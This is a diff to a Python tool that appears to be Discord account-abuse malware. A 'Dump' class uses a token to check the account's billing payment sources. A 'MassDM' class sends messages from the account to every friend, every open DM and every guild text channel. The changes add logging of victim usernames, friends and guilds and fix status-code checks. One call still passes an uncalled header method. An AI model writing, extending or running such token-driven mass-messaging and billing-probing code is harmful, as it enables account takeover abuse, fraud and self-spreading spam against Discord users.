@@ -7,6 +7,10 @@ import time
 from config import config
 import asyncio
 
+from colorama import Fore
+from colorama import Style
+from datetime import datetime
+
 class Dump:
     def get_headers(self, token, content_type="application/json"):
         headers = {
@@ -32,6 +36,7 @@ class Dump:
         
     def get_payment(self, token):
         data = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token))
+        #disord just returns an empty array if no billing
         data2 = len(json.loads(data.text))
         return bool(data2)
 
@@ -83,15 +88,15 @@ class Dump:
         payload = json.dumps({"recipients": [recipient]})
         
         data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers, data=payload)
-        print(json.loads(data.text)['id'] + ' dm id')
         return json.loads(data.text)['id']
     
 
 
 class MassDM:
-    async def init(self, token):
+    async def init(self, token, name):
         self.token = token
         self.headers = await self.get_headers(token)
+        self.name = name
 
     async def get_headers(self, token, content_type="application/json"):
         headers = {
@@ -127,11 +132,11 @@ class MassDM:
             }
             req = requests.post(f'https://discordapp.com/api/channels/{channel_id}/messages', headers=self.headers, json=body)
             data = json.loads(req.text)
-
-            if data.status_code == 401:
+            print(data)
+            if req.status_code == 401:
                 break
         
-            if data.status_code == 403:
+            if req.status_code == 403:
                 break
 
             if 'retry_after' in data:
@@ -166,12 +171,18 @@ class MassDM:
                 dm_id = await self.open_dm(relationship['id'])
                 # dm_id = self.message_channel(dm_id)
                 await self.close_dm(dm_id)
+                print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')
+
+            print('Done messaging friends')
+
     
     async def message_dms(self):
         for dm in await self.get_dms():
-            print(dm)
             await self.message_channel(dm['id'])
             await self.close_dm(dm['id'])
+            print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [DM:{dm["recipients"]}]')
+
+        print('Done messaging dms')
 
 
     async def message_guilds(self):
@@ -179,6 +190,10 @@ class MassDM:
             for channel in await self.get_guild_channels(guild['id']):
                 if channel['type'] == 0:
                     await self.message_channel(channel['id'])
+                    print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')
+
+        print('Done messaging guilds')
+
 
 
     
